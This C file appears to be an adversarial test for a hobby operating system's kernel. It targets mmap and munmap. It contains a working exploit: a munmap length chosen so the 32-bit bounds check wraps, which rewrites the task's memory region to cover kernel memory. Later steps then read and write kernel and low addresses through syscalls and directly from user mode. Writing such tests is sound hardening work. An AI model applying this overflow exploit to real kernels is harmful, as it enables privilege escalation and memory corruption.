/* atk_mmap.c -- attack vector: SYS_MMAP / SYS_MUNMAP (src/task.c:1690-1708,
 * src/vma.c:212-261).
 *
 * WHY IT MIGHT CRASH
 *   vma_munmap() validates the range with
 *       addr + ((len + 0xFFF) & ~0xFFF) > USER_EXT_END
 *   which WRAPS in 32-bit arithmetic: addr = 0x2402000 and len = 0xFFFFF000
 *   make the sum 0x003FF000, i.e. "inside" the arena.  end then becomes
 *   0x003FF000 < start, the `for (p = start; p < end; ...)` unmap loop is
 *   skipped, `end > v->end` is false, and the final `v->start = end;`
 *   REWRITES the VMA to cover [0x3FF000, v->end) -- low physical memory,
 *   the kernel image and the whole task arena.  After that
 *   vma_contains()/validate_uaddr() accept almost any address, so every
 *   "validated" user pointer in the task walks into memory the task was
 *   never given.
 *   Also exercised: munmap of the image / vsyscall / stack windows, double
 *   munmap, and mmap of 0 / 4 MiB+1 / with prot and flags fuzz.
 */
#include "atk_common.h"

catos_api_t *__ce_api __attribute__((section(".ce_api"))) = (catos_api_t *)0;

static char b[8192];

__attribute__((section(".text.ce_entry")))
int ce_main(int argc, char **argv) {
    catos_api_t *api = A();
    void *mp;
    int i;
    (void)argc; (void)argv;

    w("ATK-MMAP: mmap/munmap range arithmetic\n");

    step(1); mark("mmap argument edges\n");
    {
        static const uint32_t L[] = { 0u, 1u, 4096u, 0x400000u, 0x400001u,
                                      0x7FFFFFFFu, 0x80000000u, 0xFFFFFFFFu };
        for (i = 0; i < (int)(sizeof(L) / sizeof(L[0])); i++) {
            mh("len", L[i]);
            mp = api->mmap(0, L[i], 3, 0);
            mh("p", (uint32_t)mp);
            w(" ");
            if ((uint32_t)mp < 0x1000u) { /* error, nothing to free */ }
            else api->munmap(mp, L[i] > 0x400000u ? 0x400000u : L[i]);
        }
        nl();
    }
    mh("non-null addr", (uint32_t)api->mmap((void *)0x02400000u, 4096, 3, 0));
    mh("flags!=0", (uint32_t)api->mmap(0, 4096, 3, 1));
    mh("prot huge", (uint32_t)api->mmap(0, 4096, 0x7FFFFFFF, 0));
    nl();

    step(2); mark("munmap of the image / vsyscall / stack / heap windows\n");
    m("image", api->munmap((void *)0x02000000u, 4096));
    m("vsyscall", api->munmap((void *)0x02080000u, 4096));
    m("stack", api->munmap((void *)0x021F0000u, 4096));
    m("heap", api->munmap((void *)0x02100000u, 4096));
    m("len0", api->munmap((void *)0x02400000u, 0));
    nl();

    step(3); mark("one real mmap, then the 32-bit wrap munmap\n");
    mp = api->mmap(0, 0x4000, 3, 0);
    mh("mp", (uint32_t)mp);
    nl();
    if ((uint32_t)mp >= 0x1000u) {
        /* touch it so the pages are real */
        ((char *)mp)[0] = 0x11;
        ((char *)mp)[0x3FFF] = 0x22;
        /* len chosen so addr + round_up(len) wraps to exactly 0:
         * 0x02402000 + 0xFDBFE000 = 0x1_0000_0000 -> end = 0, so
         * v->start = 0 and the VMA now claims ALL of low memory. */
        mh("munmap wrap", (uint32_t)api->munmap(mp, 0xFDBFE000u));
        nl();
        mh("brk now", (uint32_t)api->brk((void *)0));
        nl();

        /* After the smash the VMA claims [0x3FF000, ...): ask the kernel
         * to validate and write low/kernel addresses through syscalls. */
        step(4); mark("post-smash: syscalls with low/kernel pointers\n");
        m("brk", (int)(uint32_t)api->brk((void *)0));
        m("cat@0x100000", api->cat("/BIN/HELLO.CE", (char *)0x00100000u, 64));
        m("cat@0xB8000", api->cat("/BIN/HELLO.CE", (char *)0x000B8000u, 64));
        m("cat@0x1000", api->cat("/BIN/HELLO.CE", (char *)0x00001000u, 64));
        m("save@0x100000",
          api->save("/TMP/X.TXT", (const char *)0x00100000u, 64));
        m("save@0xB8000",
          api->save("/TMP/X.TXT", (const char *)0x000B8000u, 64));
        m("hwstr@0x100000", api->hw_str(0, (char *)0x00100000u, 32));
        m("hwstr@0xB8000", api->hw_str(0, (char *)0x000B8000u, 32));
        m("strlen@0x100000", (int)api->strlen((const char *)0x00100000u));
        api->strcpy((char *)0x00001000u, "x");   /* void; must be rejected */
        w("strcpy@0x1000 done ");
        m("readline@0x1000", api->readline((char *)0x00001000u, 0));
        m("file_read@0x100000",
          api->file_read("/BIN/HELLO.CE", (char *)0x00100000u, 16000, 0));
        nl();

        step(5); mark("post-smash: touch the low addresses from ring3\n");
        /* If the VMA is still believed to cover them, these writes either
         * fault (task killed) or land somewhere they must not. */
        ((volatile char *)0x00100000u)[0] = 0x5A;
        w("wrote 0x100000\n");
        ((volatile char *)0x000B8000u)[0] = 0x5A;
        w("wrote 0xB8000\n");
    }

    step(6); mark("mmap storm: 400 x 12 KiB regions (arena = 4 MiB)\n");
    {
        static void *mv[400];
        int n = 0;
        for (i = 0; i < 400; i++) {
            mv[i] = api->mmap(0, 1, 3, 0);        /* 1 byte -> 12 KiB slot */
            if (!mv[i] || (uint32_t)mv[i] < 0x1000u) break;
            ((char *)mv[i])[0] = 1;
            n++;
        }
        m("got", n);
        nl();
        for (i = 0; i < n; i += 2) api->munmap(mv[i], 1);   /* partial mix */
        for (i = 1; i < n; i += 2) api->munmap(mv[i], 1);
    }

    step(7); mark("double munmap\n");
    mp = api->mmap(0, 4096, 3, 0);
    mh("mp", (uint32_t)mp);
    if ((uint32_t)mp >= 0x1000u) {
        m("1st", api->munmap(mp, 4096));
        m("2nd", api->munmap(mp, 4096));
        m("3rd", api->munmap(mp, 4096));
    }
    nl();

    w("\nATK-DONE\n");
    return 0;
}
